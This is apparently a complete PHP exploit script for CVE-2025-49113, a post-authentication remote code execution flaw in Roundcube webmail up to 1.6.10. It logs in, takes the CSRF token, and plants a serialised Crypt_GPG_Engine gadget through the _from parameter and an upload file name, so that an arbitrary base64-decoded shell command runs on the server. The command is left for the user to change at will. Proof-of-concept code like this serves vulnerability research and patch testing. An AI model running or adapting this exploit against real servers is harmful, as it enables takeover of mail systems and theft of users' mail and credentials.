<?php
/**
 * CVE-2025-49113 - Roundcube ≤1.6.10 Post-Auth RCE Exploit PoC (fixed)
 * Author: Taylor Christian Newsome (original) / Waifu-enhanced edition 😈
 * Date: 2025-07-28 → 2026 fix
 *
 * Usage: php rcube_exploit.php
 * Targets: Roundcube 1.5.0–1.5.9 or 1.6.0–1.6.10
 */

$target   = "http://127.0.0.1:8080";           // Roundcube base URL
$username = "demo@example.com";
$password = "password123";
$cmd      = "id > /tmp/pwned && whoami";      // change this to whatever you want

// ──────────────────────────────────────────────
function login($target, $user, $pass) {
    $ch = curl_init("$target/?_task=login");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_COOKIEJAR      => "cookies.txt",
        CURLOPT_COOKIEFILE     => "cookies.txt",
    ]);
    $html = curl_exec($ch);

    if (!preg_match('/name="_token" value="([^"]+)"/', $html, $m)) {
        die("[-] Failed to grab CSRF token\n");
    }
    $token = $m[1];

    curl_setopt_array($ch, [
        CURLOPT_URL        => "$target/?_task=login",
        CURLOPT_POST       => true,
        CURLOPT_POSTFIELDS => http_build_query([
            '_token' => $token,
            '_task'  => 'login',
            '_action'=> 'login',
            '_user'  => $user,
            '_pass'  => $pass,
        ]),
    ]);
    curl_exec($ch);
    curl_close($ch);

    if (!file_exists("cookies.txt") || filesize("cookies.txt") < 10) {
        die("[-] Login failed — check creds or target\n");
    }
    echo "[+] Logged in — session cookie saved\n";
}

// ──────────────────────────────────────────────
function exploit($target, $cmd) {
    $b64   = base64_encode($cmd);
    $shell = "echo $b64 | base64 -d | sh";
    $len   = strlen($shell);

    // Classic Crypt_GPG_Engine gadget
    $gadget = 'O:16:"Crypt_GPG_Engine":3:{s:8:"_process";b:0;s:8:"_gpgconf";s:' .
              $len . ':"' . addslashes($shell) . '";s:8:"_homedir";s:0:"";}';

    // The magic: corrupt session via _from param + filename injection
    $from_payload = 'edit-!"|i:0;' . $gadget . ';i:0;b:0;}';

    $boundary = '----WaifuFormBoundary' . bin2hex(random_bytes(10));
    $png      = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==');

    $body  = "--$boundary\r\n";
    $body .= "Content-Disposition: form-data; name=\"_file[]\"; filename=\"$from_payload\"\r\n";
    $body .= "Content-Type: image/png\r\n\r\n$png\r\n";
    $body .= "--$boundary--\r\n";

    $ch = curl_init("$target/?_task=settings&_framed=1&_remote=1&_action=upload&_from=$from_payload&_uploadid=waifu" . time());
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $body,
        CURLOPT_HTTPHEADER     => [
            "Content-Type: multipart/form-data; boundary=$boundary",
            "X-Requested-With: XMLHttpRequest",
        ],
        CURLOPT_COOKIEFILE     => "cookies.txt",
        CURLOPT_COOKIEJAR      => "cookies.txt",
    ]);

    $resp = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    if ($info['http_code'] === 200 && strpos($resp, '"status":"ok"') !== false) {
        echo "[+] Payload delivered — command should execute on next deserialization trigger (preferences load, logout, etc.)\n";
        echo "    Executed: $cmd\n";
    } else {
        echo "[-] Upload failed (HTTP {$info['http_code']})\nResponse: $resp\n";
    }
}

// ──────────────────────────────────────────────
echo "[*] Starting CVE-2025-49113 exploit...\n";
@unlink("cookies.txt"); // clean up old sessions

login($target, $username, $password);
exploit($target, $cmd);

echo "[*] Done. Check /tmp/ or wherever your cmd writes. Fly free bb 💕\n";
?>
